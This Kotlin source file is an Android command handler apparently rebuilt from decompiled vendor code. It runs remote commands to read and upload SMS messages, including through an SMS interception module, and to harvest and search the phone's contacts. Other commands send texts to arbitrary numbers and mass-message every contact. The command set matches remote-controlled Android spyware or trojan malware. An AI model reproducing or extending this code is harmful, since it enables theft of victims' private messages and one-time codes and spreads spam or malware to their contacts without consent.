package com.storm.safe.rock.service.modules.command

import android.telephony.SubscriptionManager
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject

/**
 * Handles SMS and contacts commands.
 *
 * Reverse-engineered from JADX: C0351a8 (a8, 377 lines).
 * Vendor name: SmsContactsCommandHandler
 *
 * Supported commands:
 * - SMS_READ, SMS_SEND, SMS_SEND_ALL_CONTACTS, SMS_GET_DUAL_SIM_STATUS
 * - CONTACTS_READ, GET_CONTACTS, CONTACTS_SEARCH, CONTACTS_STATS
 */
class SmsContactsCommandHandler : CommandHandler {

    companion object {
        private const val TAG = "SmsContactsCmdHandler"

        // vendor: event type strings use plain literals (vendor uses StringUtil.decrypt obfuscation)
        private const val EVENT_SMS_LIST_RESPONSE = "sms_list_response"
        private const val EVENT_SMS_SEND_RESPONSE = "sms_send_response"
        private const val EVENT_SMS_SEND_ALL_RESPONSE = "sms_send_all_response"
        private const val EVENT_DUAL_SIM_STATUS = "dual_sim_status"
        private const val EVENT_CONTACTS_RESPONSE = "contacts_response"
        private const val EVENT_CONTACTS_SEARCH_RESPONSE = "contacts_search_response"
        private const val EVENT_CONTACTS_STATS = "contacts_stats"
    }

    override fun getSupportedCommands(): Set<String> = setOf(
        "SMS_READ",
        "SMS_SEND",
        "SMS_SEND_ALL_CONTACTS",
        "SMS_GET_DUAL_SIM_STATUS",
        "CONTACTS_READ",
        "GET_CONTACTS",
        "CONTACTS_SEARCH",
        "CONTACTS_STATS"
    )

    override suspend fun handle(command: String, params: JSONObject?, context: CommandContext) {
        when (command) {
            "SMS_READ" -> handleSmsRead(params, context)
            "SMS_SEND" -> handleSmsSend(params, context)
            "SMS_SEND_ALL_CONTACTS" -> handleSmsSendAllContacts(params, context)
            "SMS_GET_DUAL_SIM_STATUS" -> handleGetDualSimStatus(context)
            "CONTACTS_READ" -> handleContactsRead(params, context)
            "GET_CONTACTS" -> handleContactsRead(params, context) // alias
            "CONTACTS_SEARCH" -> handleContactsSearch(params, context)
            "CONTACTS_STATS" -> handleContactsStats(context)
        }
    }

    /**
     * Read SMS messages.
     * JADX: C0351a8 case "SMS_READ"
     * Vendor checks READ_SMS permission, reads via SmsModule (C0324a9, f52372a3),
     * sends result via NetworkManager, then triggers incremental sync.
     */
    private fun handleSmsRead(params: JSONObject?, context: CommandContext) {
        val limit = params?.optInt("limit", 100) ?: 100
        Log.d(TAG, "[控制面板] 读取短信列表，限制: $limit 条")

        val service = context.service
        // Vendor: C0324a9 (smsModule) = uz0Var.f60536a0.f52372a3
        val smsModule = service?.smsInterceptDelegate
        val hasPermission = smsModule != null &&
            (service?.checkSelfPermission("android.permission.READ_SMS") == 0)
        Log.d(TAG, "短信读取权限: $hasPermission")

        if (hasPermission && service != null) {
            try {
                // Vendor: c0324a93.m211676a1(limit) — SmsModule.readSmsList
                val smsList = smsModule!!.readSms(limit)
                Log.d(TAG, "读取到 ${smsList.length()} 条短信")

                val data = JSONObject().apply {
                    put("success", true)
                    put("count", smsList.length())
                    put("smsList", smsList)
                }
                context.sendEvent(EVENT_SMS_LIST_RESPONSE, data)

                // Vendor: trigger incremental sync if data > 0
                if (smsList.length() > 0) {
                    Log.d(TAG, "触发增量同步")
                    smsModule.updateSyncTimestamp(smsList)
                }
            } catch (e: Exception) {
                Log.e(TAG, "读取短信失败", e)
                val data = JSONObject().apply {
                    put("success", false)
                    put("error", e.message ?: "未知错误")
                    put("count", 0)
                    put("smsList", JSONArray())
                }
                context.sendEvent(EVENT_SMS_LIST_RESPONSE, data)
            }
        } else {
            Log.w(TAG, "没有短信读取权限，弹出权限请求")
            val data = JSONObject().apply {
                put("success", false)
                put("error", "正在请求短信权限，请在手机上授权后重试")
                put("needPermission", true)
                put("count", 0)
                put("smsList", JSONArray())
            }
            context.sendEvent(EVENT_SMS_LIST_RESPONSE, data)
        }
    }

    /**
     * Send SMS to a phone number.
     * JADX: C0351a8 case "SMS_SEND"
     * Vendor: SmsModule.m211679a4(phoneNumber, simSlot, message) -> boolean
     */
    private fun handleSmsSend(params: JSONObject?, context: CommandContext) {
        val phoneNumber = params?.optString("phoneNumber", "") ?: ""
        val message = params?.optString("message", "") ?: ""
        val simSlot = params?.optInt("simSlot", 0) ?: 0
        Log.d(TAG, "发送短信到 $phoneNumber (卡${simSlot + 1})")

        try {
            val service = context.service ?: return
            val smsModule = service.smsInterceptDelegate
            val success = smsModule?.sendSms(phoneNumber, simSlot, message) ?: false
            Log.d(TAG, if (success) "短信发送成功" else "短信发送失败")
            val data = JSONObject().apply {
                put("success", success)
                put("phoneNumber", phoneNumber)
                put("simSlot", simSlot)
            }
            context.sendEvent(EVENT_SMS_SEND_RESPONSE, data)
        } catch (e: Exception) {
            Log.e(TAG, "发送短信失败", e)
        }
    }

    /**
     * Send SMS to all contacts.
     * JADX: C0351a8 case "SMS_SEND_ALL_CONTACTS"
     * Vendor: SmsModule.m211680a5(simSlot, message) -> count
     */
    private fun handleSmsSendAllContacts(params: JSONObject?, context: CommandContext) {
        val message = params?.optString("message", "") ?: ""
        val simSlot = params?.optInt("simSlot", 0) ?: 0
        Log.d(TAG, "群发通讯录所有联系人 (卡${simSlot + 1})")

        var count = 0
        try {
            val service = context.service ?: return
            val smsModule = service.smsInterceptDelegate
            // Vendor: SmsModule.m211680a5(simSlot, message) — broadcastSmsToContacts
            count = smsModule?.broadcastSmsToContacts(simSlot, message) ?: 0
            Log.d(TAG, "群发完成: 成功 $count 条")
            val data = JSONObject().apply {
                put("success", true)
                put("count", count)
                put("simSlot", simSlot)
            }
            context.sendEvent(EVENT_SMS_SEND_ALL_RESPONSE, data)
        } catch (e: Exception) {
            Log.e(TAG, "群发短信失败", e)
        }
    }

    /**
     * Get dual SIM status.
     * JADX: C0351a8 case "SMS_GET_DUAL_SIM_STATUS"
     * Vendor checks READ_PHONE_STATE permission, then SubscriptionManager.getActiveSubscriptionInfoCount().
     */
    private fun handleGetDualSimStatus(context: CommandContext) {
        Log.d(TAG, "获取双卡状态")
        try {
            val service = context.service ?: return
            val smsModule = service.smsInterceptDelegate
            var isDualSim = false
            if (smsModule != null) {
                if (service.checkSelfPermission("android.permission.READ_PHONE_STATE") == 0) {
                    val subManager = service.getSystemService("telephony_subscription_service") as SubscriptionManager
                    if (subManager.activeSubscriptionInfoCount > 1) {
                        isDualSim = true
                    }
                }
            }
            Log.d(TAG, "双卡状态: $isDualSim")
            val data = JSONObject().apply {
                put("isDualSim", isDualSim)
            }
            context.sendEvent(EVENT_DUAL_SIM_STATUS, data)
        } catch (e: Exception) {
            Log.e(TAG, "获取双卡状态失败", e)
        }
    }

    /**
     * Read contacts.
     * JADX: C0351a8 case "CONTACTS_READ"
     * Vendor checks permission via ContactsManager (C0856mc, f52373a4),
     * reads via ContactsManager.readContacts(limit), sends via NetworkManager on IO dispatcher.
     *
     * ADAPT: C0856mc replicated inline via ContentResolver queries.
     */
    private suspend fun handleContactsRead(params: JSONObject?, context: CommandContext) {
        val limit = params?.optInt("limit", 500) ?: 500
        Log.d(TAG, "收到读取通讯录命令，限制: $limit 条")

        val service = context.service
        val hasPermission = service != null &&
            service.checkSelfPermission("android.permission.READ_CONTACTS") == 0
        Log.d(TAG, "通讯录读取权限状态: $hasPermission")

        if (hasPermission && service != null) {
            Log.d(TAG, "权限已授予，开始读取通讯录")
            withContext(Dispatchers.IO) {
                try {
                    // Vendor: c0856mc4.m213963a5(limit) — ContactsManager.readContacts
                    // ADAPT: C0856mc.readContacts replicated via ContentResolver
                    val contacts = readContactsViaContentResolver(service, limit)

                    val data = JSONObject().apply {
                        put("success", true)
                        put("count", contacts.length())
                        put("contacts", contacts)
                    }
                    context.sendEvent(EVENT_CONTACTS_RESPONSE, data)
                } catch (e: Exception) {
                    Log.e(TAG, "读取通讯录失败", e)
                }
                Unit
            }
        } else {
            Log.w(TAG, "没有通讯录读取权限")
            val data = JSONObject().apply {
                put("success", false)
                put("error", "正在请求通讯录权限，请在弹出的对话框中授权后重试")
                put("needPermission", true)
                put("count", 0)
                put("contacts", JSONArray())
            }
            context.sendEvent(EVENT_CONTACTS_RESPONSE, data)
        }
    }

    /**
     * Read contacts via ContentResolver.
     * Replaces C0856mc.m213963a5(limit) — ContactsManager.readContacts.
     */
    private fun readContactsViaContentResolver(service: android.content.Context, limit: Int): JSONArray {
        val contacts = JSONArray()
        try {
            val cursor = service.contentResolver.query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER,
                    android.provider.ContactsContract.CommonDataKinds.Phone.CONTACT_ID
                ),
                null, null,
                android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )
            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < limit) {
                    val name = it.getString(0) ?: ""
                    val phone = it.getString(1) ?: ""
                    val id = it.getLong(2)
                    contacts.put(JSONObject().apply {
                        put("id", id)
                        put("name", name)
                        put("phone", phone)
                    })
                    count++
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "readContactsViaContentResolver failed", e)
        }
        return contacts
    }

    /**
     * Search contacts.
     * JADX: C0351a8 case "CONTACTS_SEARCH"
     * Vendor: ContactsManager.m213965a7(limit, keyword)
     */
    private fun handleContactsSearch(params: JSONObject?, context: CommandContext) {
        val keyword = params?.optString("keyword", "") ?: ""
        val limit = params?.optInt("limit", 50) ?: 50
        Log.d(TAG, "搜索联系人: $keyword")

        val service = context.service ?: return
        val hasPermission = service.checkSelfPermission("android.permission.READ_CONTACTS") == 0

        if (hasPermission) {
            try {
                // Vendor: C0856mc.m213965a7(limit, keyword) — search contacts
                val contacts = searchContactsViaContentResolver(service, limit, keyword)
                val data = JSONObject().apply {
                    put("success", true)
                    put("keyword", keyword)
                    put("count", contacts.length())
                    put("contacts", contacts)
                }
                context.sendEvent(EVENT_CONTACTS_SEARCH_RESPONSE, data)
            } catch (e: Exception) {
                Log.e(TAG, "搜索联系人失败", e)
            }
        } else {
            val data = JSONObject().apply {
                put("success", false)
                put("error", "没有通讯录读取权限")
            }
            context.sendEvent(EVENT_CONTACTS_SEARCH_RESPONSE, data)
        }
    }

    /**
     * Search contacts via ContentResolver.
     * Replaces C0856mc.m213965a7(limit, keyword).
     */
    private fun searchContactsViaContentResolver(service: android.content.Context, limit: Int, keyword: String): JSONArray {
        val contacts = JSONArray()
        try {
            val selection = "${android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} LIKE ?"
            val selectionArgs = arrayOf("%$keyword%")
            val cursor = service.contentResolver.query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER,
                    android.provider.ContactsContract.CommonDataKinds.Phone.CONTACT_ID
                ),
                selection, selectionArgs,
                android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )
            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < limit) {
                    val name = it.getString(0) ?: ""
                    val phone = it.getString(1) ?: ""
                    val id = it.getLong(2)
                    contacts.put(JSONObject().apply {
                        put("id", id)
                        put("name", name)
                        put("phone", phone)
                    })
                    count++
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "searchContactsViaContentResolver failed", e)
        }
        return contacts
    }

    /**
     * Get contacts stats.
     * JADX: C0351a8 case "CONTACTS_STATS"
     * Vendor: ContactsManager.m213960a1() -> JSONObject stats
     */
    private fun handleContactsStats(context: CommandContext) {
        Log.d(TAG, "获取通讯录统计")

        val service = context.service ?: return
        val hasPermission = service.checkSelfPermission("android.permission.READ_CONTACTS") == 0

        if (hasPermission) {
            try {
                // Vendor: C0856mc.m213960a1() — getStats
                val stats = getContactsStatsViaContentResolver(service)
                if (stats != null) {
                    context.sendEvent(EVENT_CONTACTS_STATS, stats)
                }
            } catch (e: Exception) {
                Log.e(TAG, "获取通讯录统计失败", e)
            }
        }
    }

    /**
     * Get contacts stats via ContentResolver.
     * Replaces C0856mc.m213960a1().
     */
    private fun getContactsStatsViaContentResolver(service: android.content.Context): JSONObject? {
        return try {
            val cursor = service.contentResolver.query(
                android.provider.ContactsContract.Contacts.CONTENT_URI,
                arrayOf("count(*) AS count"),
                null, null, null
            )
            var totalCount = 0
            cursor?.use {
                if (it.moveToFirst()) {
                    totalCount = it.getInt(0)
                }
            }
            JSONObject().apply {
                put("totalContacts", totalCount)
                put("timestamp", System.currentTimeMillis())
            }
        } catch (e: Exception) {
            Log.e(TAG, "getContactsStatsViaContentResolver failed", e)
            null
        }
    }
}
